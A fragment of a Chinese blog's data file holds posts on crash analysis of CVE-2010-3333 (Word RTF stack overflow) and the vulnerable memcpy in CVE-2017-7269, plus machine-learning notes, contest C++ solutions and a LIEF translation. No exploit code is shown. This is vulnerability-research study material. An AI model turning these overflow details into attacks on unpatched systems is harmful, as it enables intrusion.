title=\"crash分析\"></a>crash分析</h2><p>这个漏洞就是一个单纯栈溢出漏洞。<br>先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。</p>\n<p>首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。<br>先查看crash文档的内容。</p>\n<p><img src=\"/2017/05/10/CVE-2010-3333/1.png\" alt=\"1\"></p>\n<p>发现在一定长度后填充的大量的字符串。<br>windbg附加到word上，查看崩溃现场。</p>\n<p><img src=\"/2017/05/10/CVE-2010-3333/2.png\" alt=\"2\"></p>\n","excerpt":"","more":"<h2 id=\"前\"><a href=\"#前\" class=\"headerlink\" title=\"前\"></a>前</h2><p>2017SSCTF中遇到，顺便学习，第一次接触CVE和win的漏洞。</p>\n<h2 id=\"环境\"><a href=\"#环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p>win7 sp1 简体中文<br>word2003简体中文</p>\n<h2 id=\"crash分析\"><a href=\"#crash分析\" class=\"headerlink\" title=\"crash分析\"></a>crash分析</h2><p>这个漏洞就是一个单纯栈溢出漏洞。<br>先从一个crash样本开始。样本按照《漏洞战争》说明生成即可。</p>\n<p>首先已经知道出问题的地方在rtf文档的画图属性，由于没有正确计算参数的长度，导致strcpy的时候产生了溢出。<br>先查看crash文档的内容。</p>\n<p><img src=\"/2017/05/10/CVE-2010-3333/1.png\" alt=\"1\"></p>\n<p>发现在一定长度后填充的大量的字符串。<br>windbg附加到word上，查看崩溃现场。</p>\n<p><img src=\"/2017/05/10/CVE-2010-3333/2.png\" alt=\"2\"></p>\n"},{"title":"CVE-2017-7269","date":"2017-05-24T07:08:56.000Z","_content":"\n听闻这个漏洞的利用方式非常精妙，正巧要写一个exp，记录在此。\n\n<!--more-->\n\n## 漏洞函数\n漏洞存在于`ScStoragePathFromUrl`这函数中\n![1.png](1.png)\n在这里复制时存在溢出，对`v35`交叉引用，发现其来源于函数参数`a3`，也就是说`memcpy`的地址由参数决定。\n![2.png](2.png)","source":"_posts/CVE-2017-7269.md","raw":"---\ntitle: CVE-2017-7269\ntags:\n  - CVE\ncategories: []\ndate: 2017-05-24 15:08:56\n---\n\n听闻这个漏洞的利用方式非常精妙，正巧要写一个exp，记录在此。\n\n<!--more-->\n\n## 漏洞函数\n漏洞存在于`ScStoragePathFromUrl`这函数中\n![1.png](1.png)\n在这里复制时存在溢出，对`v35`交叉引用，发现其来源于函数参数`a3`，也就是说`memcpy`的地址由参数决定。\n![2.png](2.png)","slug":"CVE-2017-7269","published":1,"updated":"2017-05-24T07:20:00.203Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyx001chv18q58fujao","content":"<p>听闻这个漏洞的利用方式非常精妙，正巧要写一个exp，记录在此。</p>\n<a id=\"more\"></a>\n<h2 id=\"漏洞函数\"><a href=\"#漏洞函数\" class=\"headerlink\" title=\"漏洞函数\"></a>漏洞函数</h2><p>漏洞存在于<code>ScStoragePathFromUrl</code>这函数中<br><img src=\"/2017/05/24/CVE-2017-7269/1.png\" alt=\"1.png\"><br>在这里复制时存在溢出，对<code>v35</code>交叉引用，发现其来源于函数参数<code>a3</code>，也就是说<code>memcpy</code>的地址由参数决定。<br><img src=\"/2017/05/24/CVE-2017-7269/2.png\" alt=\"2.png\"></p>\n","excerpt":"<p>听闻这个漏洞的利用方式非常精妙，正巧要写一个exp，记录在此。</p>","more":"<h2 id=\"漏洞函数\"><a href=\"#漏洞函数\" class=\"headerlink\" title=\"漏洞函数\"></a>漏洞函数</h2><p>漏洞存在于<code>ScStoragePathFromUrl</code>这函数中<br><img src=\"/2017/05/24/CVE-2017-7269/1.png\" alt=\"1.png\"><br>在这里复制时存在溢出，对<code>v35</code>交叉引用，发现其来源于函数参数<code>a3</code>，也就是说<code>memcpy</code>的地址由参数决定。<br><img src=\"/2017/05/24/CVE-2017-7269/2.png\" alt=\"2.png\"></p>"},{"title":"Coursera Machine Learning 笔记","date":"2017-02-09T12:52:18.000Z","_content":"\n## Week 1\n\n1. What is machine learing?\n\n+ A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.\n\n+ 简单理解：通过P方法完成任务T，并在经验E中学习。\n\n2. achine learning 简单分为两类\n\n+ Supervised learning (监督学习)\n\t+ 通过一定的有正确答案的数据（训练集），基于此进行预测。\n    + Regression problem (回归问题)\n    + Classification problem (分类问题)\n\n+ Unsupervised learning  (非监督学习)\n\t+ 通过某种算法，基于没有正确结果之间的关系的数据进行聚合(clustering)分类。\n    + Clustering: automatically gene group\n    + Non-Clustering: Cocktail Party Algorithm(鸡尾酒晚会效应)\n\n","source":"_posts/Coursera-Machine-Learning-笔记.md","raw":"---\ntitle: Coursera Machine Learning 笔记\ntags:\n  - ML\ncategories: []\ndate: 2017-02-09 20:52:18\n---\n\n## Week 1\n\n1. What is machine learing?\n\n+ A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.\n\n+ 简单理解：通过P方法完成任务T，并在经验E中学习。\n\n2. achine learning 简单分为两类\n\n+ Supervised learning (监督学习)\n\t+ 通过一定的有正确答案的数据（训练集），基于此进行预测。\n    + Regression problem (回归问题)\n    + Classification problem (分类问题)\n\n+ Unsupervised learning  (非监督学习)\n\t+ 通过某种算法，基于没有正确结果之间的关系的数据进行聚合(clustering)分类。\n    + Clustering: automatically gene group\n    + Non-Clustering: Cocktail Party Algorithm(鸡尾酒晚会效应)\n\n","slug":"Coursera-Machine-Learning-笔记","published":1,"updated":"2017-02-19T03:30:35.860Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jyz001ehv18ysfmwak3","content":"<h2 id=\"Week-1\"><a href=\"#Week-1\" class=\"headerlink\" title=\"Week 1\"></a>Week 1</h2><ol>\n<li>What is machine learing?</li>\n</ol>\n<ul>\n<li><p>A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.</p>\n</li>\n<li><p>简单理解：通过P方法完成任务T，并在经验E中学习。</p>\n</li>\n</ul>\n<ol>\n<li>achine learning 简单分为两类</li>\n</ol>\n<ul>\n<li><p>Supervised learning (监督学习)</p>\n<ul>\n<li>通过一定的有正确答案的数据（训练集），基于此进行预测。</li>\n<li>Regression problem (回归问题)</li>\n<li>Classification problem (分类问题)</li>\n</ul>\n</li>\n<li><p>Unsupervised learning  (非监督学习)</p>\n<ul>\n<li>通过某种算法，基于没有正确结果之间的关系的数据进行聚合(clustering)分类。</li>\n<li>Clustering: automatically gene group</li>\n<li>Non-Clustering: Cocktail Party Algorithm(鸡尾酒晚会效应)</li>\n</ul>\n</li>\n</ul>\n","excerpt":"","more":"<h2 id=\"Week-1\"><a href=\"#Week-1\" class=\"headerlink\" title=\"Week 1\"></a>Week 1</h2><ol>\n<li>What is machine learing?</li>\n</ol>\n<ul>\n<li><p>A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E.</p>\n</li>\n<li><p>简单理解：通过P方法完成任务T，并在经验E中学习。</p>\n</li>\n</ul>\n<ol>\n<li>achine learning 简单分为两类</li>\n</ol>\n<ul>\n<li><p>Supervised learning (监督学习)</p>\n<ul>\n<li>通过一定的有正确答案的数据（训练集），基于此进行预测。</li>\n<li>Regression problem (回归问题)</li>\n<li>Classification problem (分类问题)</li>\n</ul>\n</li>\n<li><p>Unsupervised learning  (非监督学习)</p>\n<ul>\n<li>通过某种算法，基于没有正确结果之间的关系的数据进行聚合(clustering)分类。</li>\n<li>Clustering: automatically gene group</li>\n<li>Non-Clustering: Cocktail Party Algorithm(鸡尾酒晚会效应)</li>\n</ul>\n</li>\n</ul>\n"},{"title":"GPLT 2017","date":"2017-03-27T07:14:42.000Z","_content":"\n## Summary\n\n这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的。。\n好几个点都没拿到满分。。就酱吧\n\n### L2-020. 功夫传人\n\n```\n#include<cstdio>\n#include<iostream>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\n\nint v[maxN] = {0};\n\nint n;\ndouble z, r;\nint s[maxN] = {0};\ndouble sum;\n\nint main()\n{\n\tscanf(\"%d%lf%lf\", &n, &z, &r);\n\tr = 1 - r / 100;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint x, y;\n\t\tscanf(\"%d\", &x);\n\t\tif (x != 0)\n\t\t{\n\t\t\tfor (int j = 0; j < x; j++)\n\t\t\t{\n\t\t\t\tscanf(\"%d\", &y);\n\t\t\t\ts[y] = i;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tscanf(\"%d\", &y);\n\t\t\tv[i] = y;\n\t\t}\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (v[i] != 0)\n\t\t{\n\t\t\tint front = s[i];\n\t\t\tdouble ans = z * r;\n\t\t\twhile (front)\n\t\t\t{\n\t\t\t\tans *= r;\n\t\t\t\tfront = s[front];\n\t\t\t}\n\t\t\tsum += ans * v[i];\n\t\t}\n\t}\n\tprintf(\"%ld\\n\", (LL)sum);\n\treturn 0;\n}\n```\n\n### L3-013. 非常弹的球\n\n```\n#include<cstdio>\n#include<iostream>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst float g = 9.8;\n\nint w;\nint p;\nfloat ans;\n\nint main()\n{\n\tscanf(\"%d%d\", &w, &p);\n\tfloat q = (float)p / 100.0;\n\tans = (200000.0 / 9.8) / (float)w / q;\n\tprintf(\"%.3f\\n\", ans);\n\treturn 0;\n}\n```","source":"_posts/GPLT-2017.md","raw":"---\ntitle: GPLT 2017\ntags:\n  - GPLT\ncategories: []\ndate: 2017-03-27 15:14:42\n---\n\n## Summary\n\n这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的。。\n好几个点都没拿到满分。。就酱吧\n\n### L2-020. 功夫传人\n\n```\n#include<cstdio>\n#include<iostream>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\n\nint v[maxN] = {0};\n\nint n;\ndouble z, r;\nint s[maxN] = {0};\ndouble sum;\n\nint main()\n{\n\tscanf(\"%d%lf%lf\", &n, &z, &r);\n\tr = 1 - r / 100;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint x, y;\n\t\tscanf(\"%d\", &x);\n\t\tif (x != 0)\n\t\t{\n\t\t\tfor (int j = 0; j < x; j++)\n\t\t\t{\n\t\t\t\tscanf(\"%d\", &y);\n\t\t\t\ts[y] = i;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tscanf(\"%d\", &y);\n\t\t\tv[i] = y;\n\t\t}\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (v[i] != 0)\n\t\t{\n\t\t\tint front = s[i];\n\t\t\tdouble ans = z * r;\n\t\t\twhile (front)\n\t\t\t{\n\t\t\t\tans *= r;\n\t\t\t\tfront = s[front];\n\t\t\t}\n\t\t\tsum += ans * v[i];\n\t\t}\n\t}\n\tprintf(\"%ld\\n\", (LL)sum);\n\treturn 0;\n}\n```\n\n### L3-013. 非常弹的球\n\n```\n#include<cstdio>\n#include<iostream>\n#include<vector>\n\nusing namespace std;\ntypedef long long LL;\n\nconst float g = 9.8;\n\nint w;\nint p;\nfloat ans;\n\nint main()\n{\n\tscanf(\"%d%d\", &w, &p);\n\tfloat q = (float)p / 100.0;\n\tans = (200000.0 / 9.8) / (float)w / q;\n\tprintf(\"%.3f\\n\", ans);\n\treturn 0;\n}\n```","slug":"GPLT-2017","published":1,"updated":"2017-03-27T08:06:09.812Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jz1001ghv18okf14d6r","content":"<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的。。<br>好几个点都没拿到满分。。就酱吧</p>\n<h3 id=\"L2-020-功夫传人\"><a href=\"#L2-020-功夫传人\" class=\"headerlink\" title=\"L2-020. 功夫传人\"></a>L2-020. 功夫传人</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> v[maxN] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">double</span> z, r;</div><div class=\"line\"><span class=\"keyword\">int</span> s[maxN] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">double</span> sum;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%lf%lf\"</span>, &amp;n, &amp;z, &amp;r);</div><div class=\"line\">\tr = <span class=\"number\">1</span> - r / <span class=\"number\">100</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x, y;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; x; j++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\t\ts[y] = i;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\tv[i] = y;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (v[i] != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">int</span> front = s[i];</div><div class=\"line\">\t\t\t<span class=\"keyword\">double</span> ans = z * r;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (front)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans *= r;</div><div class=\"line\">\t\t\t\tfront = s[front];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tsum += ans * v[i];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%ld\\n\"</span>, (LL)sum);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"L3-013-非常弹的球\"><a href=\"#L3-013-非常弹的球\" class=\"headerlink\" title=\"L3-013. 非常弹的球\"></a>L3-013. 非常弹的球</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">float</span> g = <span class=\"number\">9.8</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> w;</div><div class=\"line\"><span class=\"keyword\">int</span> p;</div><div class=\"line\"><span class=\"keyword\">float</span> ans;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;w, &amp;p);</div><div class=\"line\">\t<span class=\"keyword\">float</span> q = (<span class=\"keyword\">float</span>)p / <span class=\"number\">100.0</span>;</div><div class=\"line\">\tans = (<span class=\"number\">200000.0</span> / <span class=\"number\">9.8</span>) / (<span class=\"keyword\">float</span>)w / q;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%.3f\\n\"</span>, ans);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Summary\"><a href=\"#Summary\" class=\"headerlink\" title=\"Summary\"></a>Summary</h2><p>这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的。。<br>好几个点都没拿到满分。。就酱吧</p>\n<h3 id=\"L2-020-功夫传人\"><a href=\"#L2-020-功夫传人\" class=\"headerlink\" title=\"L2-020. 功夫传人\"></a>L2-020. 功夫传人</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> v[maxN] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">double</span> z, r;</div><div class=\"line\"><span class=\"keyword\">int</span> s[maxN] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">double</span> sum;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%lf%lf\"</span>, &amp;n, &amp;z, &amp;r);</div><div class=\"line\">\tr = <span class=\"number\">1</span> - r / <span class=\"number\">100</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x, y;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; x; j++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\t\ts[y] = i;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;y);</div><div class=\"line\">\t\t\tv[i] = y;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (v[i] != <span class=\"number\">0</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">int</span> front = s[i];</div><div class=\"line\">\t\t\t<span class=\"keyword\">double</span> ans = z * r;</div><div class=\"line\">\t\t\t<span class=\"keyword\">while</span> (front)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans *= r;</div><div class=\"line\">\t\t\t\tfront = s[front];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\tsum += ans * v[i];</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%ld\\n\"</span>, (LL)sum);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h3 id=\"L3-013-非常弹的球\"><a href=\"#L3-013-非常弹的球\" class=\"headerlink\" title=\"L3-013. 非常弹的球\"></a>L3-013. 非常弹的球</h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">float</span> g = <span class=\"number\">9.8</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> w;</div><div class=\"line\"><span class=\"keyword\">int</span> p;</div><div class=\"line\"><span class=\"keyword\">float</span> ans;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;w, &amp;p);</div><div class=\"line\">\t<span class=\"keyword\">float</span> q = (<span class=\"keyword\">float</span>)p / <span class=\"number\">100.0</span>;</div><div class=\"line\">\tans = (<span class=\"number\">200000.0</span> / <span class=\"number\">9.8</span>) / (<span class=\"keyword\">float</span>)w / q;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%.3f\\n\"</span>, ans);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"LIEF部分中文文档","date":"2017-12-13T15:07:20.000Z","_content":"\n# LIEF\n\n## 分析和操作格式\n\n这部分教程的目的是概述LIEF的API用来分析处理文件的格式\n// 由学弟翻译整理\n<!-- more -->\n\n### ELF\n\n- 我们从ELF格式开始。要从一个文件创建一个ELF.Binary,我们只需朝lief.parse()或lief.ELF.parse()函数传入他的路径。\n\n>注意：如果使用的是python的API，那么lief.parse()和lief.ELF.parse()具有相同的行为。但是在C++中，LIEF::Parser::parse()将返回指向LIEF::Binary对象的指针，而LIEF::ELF::Parser::parse()将返回LIEF::ELF::**\n\n```python\nimport lief\nBinary = lief.parse(\"/bin/ls\")\n```\n\n 一旦ELF文件被解析，我们可以访问它的Header\n\n`header = binary.header`\n\n 我们还可以更改它的入口点和目标架构(ARCH)\n\n```python\nheader.entrypoint = 0x123\nheader.machine_type = 